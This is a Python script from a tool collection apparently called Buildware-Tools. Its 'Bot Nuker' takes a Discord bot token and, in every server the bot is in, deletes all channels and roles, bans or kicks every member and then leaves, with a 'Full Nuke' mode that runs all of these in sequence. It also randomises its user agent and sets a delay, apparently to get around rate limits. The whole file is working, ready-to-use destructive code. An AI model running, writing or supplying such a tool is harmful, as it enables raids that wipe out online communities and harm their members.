# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
    import time
except Exception as e:
    MissingModule(e)

Title("Bot Nuker")
Connection()

Scroll(GradientBanner(discord_banner))

try:
    bot_token = ChoiceBot()

    Scroll(f"""
 {PREFIX}01{SUFFIX} Delete All Channels
 {PREFIX}02{SUFFIX} Ban All Members
 {PREFIX}03{SUFFIX} Kick All Members
 {PREFIX}04{SUFFIX} Delete All Roles
 {PREFIX}05{SUFFIX} Leave All Servers
 {PREFIX}06{SUFFIX} Full Nuke
""")

    choice = input(f"{INPUT} Choice {red}->{reset} ").strip().lstrip("0")

    if choice not in ["1", "2", "3", "4", "5", "6"]:
        ErrorChoice()

    try:
        delay = float(input(f"{INPUT} Delay {red}->{reset} ").strip())
        if delay < 0.1:
            delay = 0.1
    except:
        delay = 0.5

    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json", "User-Agent": RandomUserAgents()}

    print(f"{LOADING} Fetching servers..", reset)

    guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)

    if guilds_response.status_code != 200:
        print(f"{ERROR} Could not fetch servers!", reset)
        Continue()
        Reset()

    guilds = guilds_response.json()

    if not guilds:
        print(f"{ERROR} Bot is not in any servers!", reset)
        Continue()
        Reset()

    print(f"{SUCCESS} Found:{red} {len(guilds)}{white} server(s)", reset)

    def DeleteChannels(guild_id, guild_name):
        channels_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if channels_response.status_code != 200:
            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch channels", reset)
            return
        channels = channels_response.json()
        for channel in channels:
            channel_id   = channel["id"]
            channel_name = channel.get("name", "Unknown")
            response     = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
            if response.status_code == 200:
                print(f"{SUCCESS} Status:{red} Deleted {white}| Channel:{red} {channel_name}{white} | Server:{red} {guild_name}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Channel:{red} {channel_name}{white} | Code:{red} {response.status_code}", reset)
            time.sleep(delay)

    def BanMembers(guild_id, guild_name):
        members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
        if members_response.status_code != 200:
            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch members", reset)
            return
        members = members_response.json()
        for member in members:
            user_id  = member["user"]["id"]
            username = member["user"].get("username", "Unknown")
            response = requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}", headers=headers)
            if response.status_code == 204:
                print(f"{SUCCESS} Status:{red} Banned  {white}| User:{red} {username}{white} | Server:{red} {guild_name}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| User:{red} {username}{white} | Code:{red} {response.status_code}", reset)
            time.sleep(delay)

    def KickMembers(guild_id, guild_name):
        members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
        if members_response.status_code != 200:
            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch members", reset)
            return
        members = members_response.json()
        for member in members:
            user_id  = member["user"]["id"]
            username = member["user"].get("username", "Unknown")
            response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}", headers=headers)
            if response.status_code == 204:
                print(f"{SUCCESS} Status:{red} Kicked  {white}| User:{red} {username}{white} | Server:{red} {guild_name}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| User:{red} {username}{white} | Code:{red} {response.status_code}", reset)
            time.sleep(delay)

    def DeleteRoles(guild_id, guild_name):
        roles_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers)
        if roles_response.status_code != 200:
            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch roles", reset)
            return
        roles = roles_response.json()
        for role in roles:
            role_id   = role["id"]
            role_name = role.get("name", "Unknown")
            if role.get("managed") or role_name == "@everyone":
                continue
            response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
            if response.status_code == 204:
                print(f"{SUCCESS} Status:{red} Deleted {white}| Role:{red} {role_name}{white} | Server:{red} {guild_name}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Role:{red} {role_name}{white} | Code:{red} {response.status_code}", reset)
            time.sleep(delay)

    def LeaveServer(guild_id, guild_name):
        response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
        if response.status_code == 204:
            print(f"{SUCCESS} Status:{red} Left    {white}| Server:{red} {guild_name}", reset)
        else:
            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Code:{red} {response.status_code}", reset)

    for guild in guilds:
        guild_id   = guild["id"]
        guild_name = guild.get("name", "Unknown")

        print(f"{INFO} Processing:{red} {guild_name}", reset)

        if choice == "1":
            DeleteChannels(guild_id, guild_name)
        elif choice == "2":
            BanMembers(guild_id, guild_name)
        elif choice == "3":
            KickMembers(guild_id, guild_name)
        elif choice == "4":
            DeleteRoles(guild_id, guild_name)
        elif choice == "5":
            LeaveServer(guild_id, guild_name)
        elif choice == "6":
            DeleteChannels(guild_id, guild_name)
            time.sleep(delay)
            DeleteRoles(guild_id, guild_name)
            time.sleep(delay)
            BanMembers(guild_id, guild_name)
            time.sleep(delay)
            LeaveServer(guild_id, guild_name)

    print(f"{SUCCESS} Completed!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)